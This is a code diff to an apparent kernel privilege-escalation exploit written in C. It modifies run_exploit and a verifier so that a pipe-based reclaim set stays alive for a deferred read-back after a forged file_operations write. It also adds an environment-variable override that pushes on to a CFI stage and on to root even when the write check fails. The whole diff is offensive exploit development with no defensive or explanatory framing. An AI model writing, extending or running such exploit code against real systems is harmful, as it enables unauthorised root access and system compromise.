@@ -436,7 +436,18 @@ static int verify_fops_data_alias_before_production(void) {
     reset_pipe_attempt();
   }
 #else
+#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
+    APP_FOPS_DEFER_ALIAS_READBACK
+  /* The deferred postwrite reader (after the production trigger) needs
+   * this exact verified pipe set alive: reset would close every reclaim
+   * fd and the read fails EBADF. The gate consumed one page per pipe;
+   * one page was rewritten after, so reread is safe. */
+  if (!fops_data_alias_deferred) {
+    reset_pipe_attempt();
+  }
+#else
   reset_pipe_attempt();
+#endif
 #endif
   pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
           "uses_slide=%d\n",
@@ -497,7 +508,17 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
 #else
+#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
+    APP_FOPS_DEFER_ALIAS_READBACK
+  /* Same lifecycle as the verifier tail: the deferred postwrite reader
+   * needs the verified reclaim set alive through the production trigger.
+   * Skip the reset only while armed; otherwise behave as before. */
+  if (!fops_data_alias_deferred) {
+    reset_pipe_attempt();
+  }
+#else
   reset_pipe_attempt();
+#endif
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
   if (!prepare_p0_pipe_oracle()) {
     pr_error("fops oracle pipe preparation failed\n");
@@ -602,6 +623,15 @@ int run_exploit(int argc, char **argv) {
     APP_FOPS_DEFER_ALIAS_READBACK
     int postwrite_result = 0;
     int probe_restored = 0;
+    /* Diagnostic override (env-gated, default off): run the CFI read-back
+     * even when the pipe-alias postwrite disagrees, to learn whether the
+     * production WRITE landed (cfi decides) vs the alias READER is broken.
+     * A passing CFI proceeds to root automatically. */
+    int force_cfi = 0;
+    {
+      const char *force_env = getenv("CFI_FORCE_DIAG");
+      force_cfi = force_env && *force_env && strcmp(force_env, "0") != 0;
+    }
     if (fops_data_alias_deferred) {
       postwrite_result = verify_p0_pipe_data_page(
           fops_data_alias_deferred_target, fake_fops);
@@ -624,7 +654,12 @@ int run_exploit(int argc, char **argv) {
 #endif
       fops_data_alias_deferred = 0;
     }
-    if (triggered && postwrite_result == 1 && probe_restored) {
+    if ((triggered && postwrite_result == 1 && probe_restored) ||
+        (triggered && force_cfi)) {
+      if (force_cfi && !(postwrite_result == 1 && probe_restored)) {
+        pr_warning("cfi force-diag override postwrite=%d restored=%d\n",
+                   postwrite_result, probe_restored);
+      }
       verified = try_cfi_stage();
     } else {
       cfi_last_step = 35;
